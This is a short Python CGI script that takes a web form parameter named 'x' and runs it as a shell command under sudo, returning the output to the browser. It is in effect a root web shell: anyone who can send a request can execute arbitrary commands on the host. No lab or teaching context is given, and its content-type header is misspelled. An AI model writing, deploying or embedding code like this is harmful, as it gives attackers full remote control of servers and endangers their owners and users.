#!/usr/bin/python3
import subprocess
import cgi

print("conten.type: text/html")
print()
form = cgi.FieldStorage()
x = form.getvalue('x')

output = subprocess.getoutput("sudo " + x)
print(output)